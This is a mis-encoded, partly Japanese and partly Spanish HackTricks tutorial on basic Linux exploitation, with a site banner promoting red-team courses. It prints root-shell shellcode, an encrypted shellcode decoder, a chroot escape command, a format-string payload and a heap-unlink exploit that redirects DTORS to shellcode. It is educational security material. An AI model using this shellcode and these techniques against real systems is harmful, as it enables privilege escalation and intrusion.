# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

ã‚«ãƒ¼ãƒãƒ«ã®å‰²ã‚Šè¾¼ã¿ã‚’è¡¨ç¤ºã™ã‚‹: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eaxã‚’ã‚¯ãƒªã‚¢\
xor ebx, ebx ; ebx = 0 ãªã®ã§å¼•æ•°ã¯æ¸¡ã•ãªã„\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ã‚’å®Ÿè¡Œ

**nasm -f elf assembly.asm** â€”> .oãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¿”ã™\
**ld assembly.o -o shellcodeout** â€”> ã‚¢ã‚»ãƒ³ãƒ–ãƒªã‚³ãƒ¼ãƒ‰ã‹ã‚‰å½¢æˆã•ã‚ŒãŸå®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¾—ã¦ã€**objdump**ã§ã‚ªãƒšã‚³ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã§ãã‚‹\
**objdump -d -Mintel ./shellcodeout** â€”> å®Ÿéš›ã«ç§ãŸã¡ã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã€ã‚ªãƒšã‚³ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã™ã‚‹

**ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒæ©Ÿèƒ½ã™ã‚‹ã‹ç¢ºèªã™ã‚‹**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ãŒæ­£ã—ãè¡Œã‚ã‚Œã¦ã„ã‚‹ã‹ç¢ºèªã™ã‚‹ã«ã¯ã€å‰è¿°ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã€ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒ¼ãƒ«ãŒ**strace ./PROGRAMA\_COMPILADO**ã«è¡¨ç¤ºã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹éš›ã«ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ã†ã“ã¨ãŒã§ãã¾ã™ã€‚æœ€åˆã®å‘½ä»¤ã¯callã¸ã®ã‚¸ãƒ£ãƒ³ãƒ—ã§ã™ã€‚callã¯å…ƒã®ã‚³ãƒ¼ãƒ‰ã‚’å‘¼ã³å‡ºã—ã€ã•ã‚‰ã«EIPã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«å…¥ã‚Œã¾ã™ã€‚callå‘½ä»¤ã®å¾Œã«å¿…è¦ãªæ–‡å­—åˆ—ã‚’å…¥ã‚Œã¦ã„ã‚‹ãŸã‚ã€ãã®EIPã‚’ä½¿ã£ã¦æ–‡å­—åˆ—ã‚’æŒ‡ã—ç¤ºã—ã€ã•ã‚‰ã«ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã‚’ç¶šã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

EJ **ãƒˆãƒªãƒƒã‚¯ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**EJ ã‚¹ã‚¿ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Huter:**

ãƒ—ãƒ­ã‚»ã‚¹ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸãƒ¡ãƒ¢ãƒªãƒšãƒ¼ã‚¸ã‚’èµ°æŸ»ã—ã€ãã“ã«ä¿å­˜ã•ã‚ŒãŸã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ¢ã™å°ã•ãªã‚³ãƒ¼ãƒ‰ã§æ§‹æˆã•ã‚Œã¦ã„ã¾ã™ï¼ˆã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«è¨­å®šã•ã‚ŒãŸç½²åã‚’æ¢ã—ã¾ã™ï¼‰ã€‚ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã™ã‚‹ãŸã‚ã®å°ã•ãªã‚¹ãƒšãƒ¼ã‚¹ã—ã‹ãªã„å ´åˆã«ä¾¿åˆ©ã§ã™ã€‚

**Shellcodes polimÃ³rficos**

æš—å·åŒ–ã•ã‚ŒãŸã‚·ã‚§ãƒ«ã§æ§‹æˆã•ã‚Œã¦ãŠã‚Šã€ãã‚Œã‚’å¾©å·åŒ–ã—ã¦ã‚¸ãƒ£ãƒ³ãƒ—ã™ã‚‹å°ã•ãªã‚³ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ã¾ã™ã€‚Call-Popã®ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ã€ã“ã‚Œã¯**æš—å·åŒ–ã•ã‚ŒãŸã‚·ãƒ¼ã‚¶ãƒ¼ã®ä¾‹**ã§ã™ï¼š
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5.è£œå®Œçš„æ‰‹æ³•**

**ãƒ ãƒ©ãƒˆæŠ€è¡“**

Linuxã§ã¯ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã¯0xbfffffffã‹ã‚‰ãƒãƒƒãƒ”ãƒ³ã‚°ã•ã‚Œã¾ã™ã€‚

Linuxã§æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã®ã‚¹ã‚¿ãƒƒã‚¯ãŒã©ã®ã‚ˆã†ã«æ§‹ç¯‰ã•ã‚Œã‚‹ã‹ã‚’è¦‹ã‚‹ã“ã¨ã§ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã¿ã‚’æŒã¤ç’°å¢ƒã§èµ·å‹•ã•ã‚Œã‚‹ã‚ˆã†ã«ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’é–‹ç™ºã§ãã¾ã™ã€‚ã“ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯æ¬¡ã®ã‚ˆã†ã«è¨ˆç®—ã§ãã¾ã™: addr = 0xbfffffff - 4 - strlen(å®Œå…¨ãªå®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«å) - strlen(shellcode)

ã“ã®ã‚ˆã†ã«ã—ã¦ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æŒã¤ç’°å¢ƒå¤‰æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ç°¡å˜ã«å–å¾—ã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€execleé–¢æ•°ãŒå¿…è¦ãªç’°å¢ƒå¤‰æ•°ã®ã¿ã‚’æŒã¤ç’°å¢ƒã‚’ä½œæˆã§ãã‚‹ãŸã‚å¯èƒ½ã§ã™ã€‚

###

###

###

###

###

### **ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã«ã‚ˆã‚‹ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼**

**sprintf**ã¯ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã•ã‚ŒãŸæ–‡å­—åˆ—ã‚’**å¤‰æ•°ã«ç§»å‹•**ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ–‡å­—åˆ—ã®**ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆ**ã‚’æ‚ªç”¨ã—ã¦ã€å†…å®¹ãŒã‚³ãƒ”ãƒ¼ã•ã‚Œã‚‹**å¤‰æ•°ã§ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’å¼•ãèµ·ã“ã™**ã“ã¨ãŒã§ãã¾ã™ã€‚\
ä¾‹ãˆã°ã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰`%.44xAAAA`ã¯**å¤‰æ•°ã«44B+"AAAA"ã‚’æ›¸ãè¾¼ã¿**ã€ã“ã‚Œã«ã‚ˆã‚Šãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### **\_\_atexitæ§‹é€ ä½“**

{% hint style="danger" %}
ç¾åœ¨ã€ã“ã‚Œã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ã®ã¯éå¸¸ã«**å¥‡å¦™ã§ã™**ã€‚
{% endhint %}

**`atexit()`**ã¯ã€**ä»–ã®é–¢æ•°ãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¨ã—ã¦æ¸¡ã•ã‚Œã‚‹**é–¢æ•°ã§ã™ã€‚ã“ã‚Œã‚‰ã®**é–¢æ•°**ã¯ã€**`exit()`**ã¾ãŸã¯**main**ã®**æˆ»ã‚Š**ã‚’å®Ÿè¡Œã™ã‚‹éš›ã«**å®Ÿè¡Œã•ã‚Œã¾ã™**ã€‚\
ã“ã‚Œã‚‰ã®**é–¢æ•°**ã®ã„ãšã‚Œã‹ã®**ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æŒ‡ã™ã‚ˆã†ã«**å¤‰æ›´**ã§ãã‚Œã°ã€**ãƒ—ãƒ­ã‚»ã‚¹ã®åˆ¶å¾¡ã‚’å¾—ã‚‹**ã“ã¨ãŒã§ãã¾ã™ãŒã€ç¾åœ¨ã¯ã“ã‚ŒãŒã‚ˆã‚Šè¤‡é›‘ã§ã™ã€‚\
ç¾åœ¨ã€å®Ÿè¡Œã•ã‚Œã‚‹**é–¢æ•°ã¸ã®ã‚¢ãƒ‰ãƒ¬ã‚¹**ã¯ã€ã„ãã¤ã‹ã®æ§‹é€ ã®èƒŒå¾Œã«**éš ã•ã‚Œã¦ãŠã‚Š**ã€æœ€çµ‚çš„ã«æŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ã¯ãªãã€**XORã§æš—å·åŒ–ã•ã‚Œ**ã€**ãƒ©ãƒ³ãƒ€ãƒ ã‚­ãƒ¼**ã§ã‚ªãƒ•ã‚»ãƒƒãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ç¾åœ¨ã“ã®æ”»æ’ƒãƒ™ã‚¯ã‚¿ãƒ¼ã¯**x86**ãŠã‚ˆã³**x64\_86**ã§ã¯ã‚ã¾ã‚Šå½¹ã«ç«‹ã¡ã¾ã›ã‚“ã€‚\
**æš—å·åŒ–é–¢æ•°**ã¯**`PTR_MANGLE`**ã§ã™ã€‚**m68kã€mips32ã€mips64ã€aarch64ã€armã€hppa**ãªã©ã®**ä»–ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£**ã¯ã€**æš—å·åŒ–**é–¢æ•°ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ãã‚Œã¯**å…¥åŠ›ã¨ã—ã¦å—ã‘å–ã£ãŸã‚‚ã®ã¨åŒã˜**ã‚’è¿”ã™ã‹ã‚‰ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚‰ã®ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¯ã“ã®ãƒ™ã‚¯ã‚¿ãƒ¼ã§æ”»æ’ƒå¯èƒ½ã§ã™ã€‚

### **setjmp() & longjmp()**

{% hint style="danger" %}
ç¾åœ¨ã€ã“ã‚Œã‚’ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã™ã‚‹ã®ã¯éå¸¸ã«**å¥‡å¦™ã§ã™**ã€‚
{% endhint %}

**`setjmp()`**ã¯**ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ï¼ˆãƒ¬ã‚¸ã‚¹ã‚¿ï¼‰ã‚’**ä¿å­˜**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚\
**`longjmp()`**ã¯**ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆ**ã‚’**å¾©å…ƒ**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚\
**ä¿å­˜ã•ã‚ŒãŸãƒ¬ã‚¸ã‚¹ã‚¿**ã¯: `EBX, ESI, EDI, ESP, EIP, EBP`\
å•é¡Œã¯ã€EIPã¨ESPãŒ**`PTR_MANGLE`**é–¢æ•°ã«ã‚ˆã£ã¦æ¸¡ã•ã‚Œã‚‹ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã“ã®æ”»æ’ƒã«å¯¾ã—ã¦è„†å¼±ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã¯ä¸Šè¨˜ã¨åŒã˜ã§ã™**ã€‚\
ã“ã‚Œã‚‰ã¯ã‚¨ãƒ©ãƒ¼å›å¾©ã‚„å‰²ã‚Šè¾¼ã¿ã«å½¹ç«‹ã¡ã¾ã™ã€‚\
ã—ã‹ã—ã€ç§ãŒèª­ã‚“ã ã¨ã“ã‚ã«ã‚ˆã‚Œã°ã€ä»–ã®ãƒ¬ã‚¸ã‚¹ã‚¿ã¯ä¿è­·ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€**é–¢æ•°å†…ã«`call ebx`ã€`call esi`ã€ã¾ãŸã¯`call edi`**ãŒã‚ã‚‹å ´åˆã€åˆ¶å¾¡ã‚’å¥ªã†ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€EBPã‚’å¤‰æ›´ã—ã¦ESPã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

**C++ã«ãŠã‘ã‚‹VTableã¨VPTR**

å„ã‚¯ãƒ©ã‚¹ã«ã¯**Vtable**ãŒã‚ã‚Šã€ã“ã‚Œã¯**ãƒ¡ã‚½ãƒƒãƒ‰ã¸ã®ãƒã‚¤ãƒ³ã‚¿ã®é…åˆ—**ã§ã™ã€‚

å„**ã‚¯ãƒ©ã‚¹**ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯**VPtr**ãŒã‚ã‚Šã€ã“ã‚Œã¯ãã®ã‚¯ãƒ©ã‚¹ã®é…åˆ—ã¸ã®**ãƒã‚¤ãƒ³ã‚¿**ã§ã™ã€‚VPtrã¯å„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ˜ãƒƒãƒ€ãƒ¼ã®ä¸€éƒ¨ã§ã‚ã‚‹ãŸã‚ã€**VPtr**ã®**ä¸Šæ›¸ã**ãŒæˆåŠŸã™ã‚Œã°ã€ãƒ€ãƒŸãƒ¼ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒ‡ã™ã‚ˆã†ã«**å¤‰æ›´**ã§ãã€é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«é£›ã¶ã“ã¨ãŒã§ãã¾ã™ã€‚

## **äºˆé˜²æªç½®ã¨å›é¿ç­–**

###

**Libsafeã®ç½®ãæ›ãˆ**

æ¬¡ã®ã‚ˆã†ã«ã‚¢ã‚¯ãƒ†ã‚£ãƒ–åŒ–ã•ã‚Œã¾ã™: LD\_PRELOAD=/lib/libsafe.so.2\
ã¾ãŸã¯\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

ä¸å®‰å…¨ãªé–¢æ•°ã¸ã®å‘¼ã³å‡ºã—ã‚’å®‰å…¨ãªã‚‚ã®ã«ç½®ãæ›ãˆã¾ã™ã€‚æ¨™æº–åŒ–ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚ï¼ˆx86å°‚ç”¨ã€-fomit-frame-pointerã§ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸã‚‚ã®ã«ã¯é©ç”¨ã•ã‚Œãšã€é™çš„ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã«ã¯é©ç”¨ã•ã‚Œãšã€ã™ã¹ã¦ã®è„†å¼±ãªé–¢æ•°ãŒå®‰å…¨ã«ãªã‚‹ã‚ã‘ã§ã¯ãªãã€LD\_PRELOADã¯suidãƒã‚¤ãƒŠãƒªã«ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“ï¼‰ã€‚

**ASCIIè£…ç”²ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“**

å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’0x00000000ã‹ã‚‰0x00ffffffã¾ã§èª­ã¿è¾¼ã‚€ã“ã¨ã§ã€å¸¸ã«ãƒã‚¤ãƒˆ0x00ãŒå­˜åœ¨ã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã—ã‹ã—ã€ã“ã‚Œã¯å®Ÿéš›ã«ã¯ã»ã¨ã‚“ã©ã®æ”»æ’ƒã‚’é˜²ãã“ã¨ã¯ã§ããšã€ç‰¹ã«ãƒªãƒˆãƒ«ã‚¨ãƒ³ãƒ‡ã‚£ã‚¢ãƒ³ã§ã¯åŠ¹æœãŒã‚ã‚Šã¾ã›ã‚“ã€‚

**ret2plt**

ROPã‚’å®Ÿè¡Œã—ã¦strcpy@pltï¼ˆpltã®ï¼‰ã‚’å‘¼ã³å‡ºã—ã€GOTã®ã‚¨ãƒ³ãƒˆãƒªã‚’æŒ‡ã—ã€å‘¼ã³å‡ºã—ãŸã„é–¢æ•°ã®æœ€åˆã®ãƒã‚¤ãƒˆï¼ˆsystem()ï¼‰ã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚ãã®å¾Œã€GOT+1ã‚’æŒ‡ã—ã€system()ã®2ãƒã‚¤ãƒˆç›®ã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã™â€¦ æœ€å¾Œã«ã€GOTã«ä¿å­˜ã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚ã“ã‚ŒãŒsystem()ã«ãªã‚Šã¾ã™ã€‚

**chroot()ã«ã‚ˆã‚‹ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹**

debootstrap -arch=i386 hardy /home/user â€”> ç‰¹å®šã®ã‚µãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«åŸºæœ¬ã‚·ã‚¹ãƒ†ãƒ ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¾ã™ã€‚

ç®¡ç†è€…ã¯æ¬¡ã®ã‚ˆã†ã«ã—ã¦ã“ã‚Œã‚‰ã®ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰å‡ºã‚‹ã“ã¨ãŒã§ãã¾ã™: mkdir foo; chroot foo; cd ..

**ã‚³ãƒ¼ãƒ‰ã®ã‚¤ãƒ³ã‚¹ãƒˆã‚¥ãƒ«ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³**

Valgrind â€”> ã‚¨ãƒ©ãƒ¼ã‚’æ¢ã—ã¾ã™ã€‚\
Memcheck\
RADï¼ˆãƒªã‚¿ãƒ¼ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ãƒ‡ã‚£ãƒ•ã‚§ãƒ³ãƒ€ãƒ¼ï¼‰\
Insure++

## **8 ãƒ’ãƒ¼ãƒ—ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼: åŸºæœ¬çš„ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ**

**å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸãƒãƒ£ãƒ³ã‚¯**

prev\_size |\
size | â€”ãƒ˜ãƒƒãƒ€ãƒ¼\
\*mem | ãƒ‡ãƒ¼ã‚¿

**ç©ºããƒãƒ£ãƒ³ã‚¯**

prev\_size |\
size |\
\*fd | å‰æ–¹ãƒãƒ£ãƒ³ã‚¯ã¸ã®ãƒã‚¤ãƒ³ã‚¿\
\*bk | å¾Œæ–¹ãƒãƒ£ãƒ³ã‚¯ã¸ã®ãƒã‚¤ãƒ³ã‚¿ â€”ãƒ˜ãƒƒãƒ€ãƒ¼\
\*mem | ãƒ‡ãƒ¼ã‚¿

ç©ºããƒãƒ£ãƒ³ã‚¯ã¯åŒæ–¹å‘ãƒªã‚¹ãƒˆï¼ˆbinï¼‰ã«ã‚ã‚Šã€2ã¤ã®ç©ºããƒãƒ£ãƒ³ã‚¯ãŒéš£æ¥ã™ã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ï¼ˆçµåˆã•ã‚Œã¾ã™ï¼‰ã€‚

â€œsizeâ€ã«ã¯ã€å‰ã®ãƒãƒ£ãƒ³ã‚¯ãŒä½¿ç”¨ä¸­ã‹ã©ã†ã‹ã€ãƒãƒ£ãƒ³ã‚¯ãŒmmap()ã«ã‚ˆã£ã¦å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸã‹ã©ã†ã‹ã€ãƒãƒ£ãƒ³ã‚¯ãŒãƒ—ãƒ©ã‚¤ãƒãƒªã‚¢ãƒªãƒ¼ãƒŠã«å±ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¤ºã™ãƒ“ãƒƒãƒˆãŒã‚ã‚Šã¾ã™ã€‚

ãƒãƒ£ãƒ³ã‚¯ã‚’è§£æ”¾ã™ã‚‹éš›ã«ã€éš£æ¥ã™ã‚‹ãƒãƒ£ãƒ³ã‚¯ã®ã„ãšã‚Œã‹ãŒç©ºã„ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã‚‰ã¯unlink()ãƒã‚¯ãƒ­ã‚’ä»‹ã—ã¦çµåˆã•ã‚Œã€æ–°ã—ã„å¤§ããªãƒãƒ£ãƒ³ã‚¯ãŒfrontlink()ã«æ¸¡ã•ã‚Œã€é©åˆ‡ãªbinã«æŒ¿å…¥ã•ã‚Œã¾ã™ã€‚

unlink(){\
BK = P->bk; â€”> æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã®BKã¯ã€ä»¥å‰ã«ç©ºã„ã¦ã„ãŸãƒãƒ£ãƒ³ã‚¯ã®BKã§ã™ã€‚\
FD = P->fd; â€”> æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã®FDã¯ã€ä»¥å‰ã«ç©ºã„ã¦ã„ãŸãƒãƒ£ãƒ³ã‚¯ã®FDã§ã™ã€‚\
FD->bk = BK; â€”> æ¬¡ã®ãƒãƒ£ãƒ³ã‚¯ã®BKã¯æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã‚’æŒ‡ã—ã¾ã™ã€‚\
BK->fd = FD; â€”> å‰ã®ãƒãƒ£ãƒ³ã‚¯ã®FDã¯æ–°ã—ã„ãƒãƒ£ãƒ³ã‚¯ã‚’æŒ‡ã—ã¾ã™ã€‚\
}

ã—ãŸãŒã£ã¦ã€P->bkã‚’ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ã€P->fdã‚’GOTã¾ãŸã¯DTORSã®ã‚¨ãƒ³ãƒˆãƒªã®ã‚¢ãƒ‰ãƒ¬ã‚¹-12ã«å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ çµ‚äº†æ™‚ã«ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

ã•ã‚‰ã«ã€unlink()ã®4ç•ªç›®ã®æ–‡ã¯ä½•ã‹ã‚’æ›¸ãè¾¼ã¿ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¯ã“ã‚Œã«å¯¾ã—ã¦ä¿®æ­£ã•ã‚Œã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> ã“ã‚Œã«ã‚ˆã‚Šã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®8ãƒã‚¤ãƒˆç›®ã‹ã‚‰4ãƒã‚¤ãƒˆãŒæ›¸ãè¾¼ã¾ã‚Œã‚‹ãŸã‚ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®æœ€åˆã®å‘½ä»¤ã¯ã“ã‚Œã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¦æ®‹ã‚Šã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«é£›ã¶ãŸã‚ã®jmpã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

